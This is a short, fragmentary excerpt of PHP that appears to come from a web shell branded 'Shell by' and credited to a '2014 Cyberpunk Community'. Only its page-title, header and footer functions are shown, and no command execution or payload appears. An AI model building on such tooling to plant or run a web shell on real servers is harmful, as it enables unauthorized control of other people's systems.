...
function sh_name() { return "Shell by ©".sh_ver; }
...
<body>
<div class=bartitle><h4>'.sh_name().'</h4></div>';
return $html_start;
};
function footer() {
  echo "<div class=bartitle colspan=2><font size=1 color=#00FF00> By , © 2014 Cyberpunk Community, Generated: ".round(getmicrotime()-starttime,4)." seconds</font></div>";
}
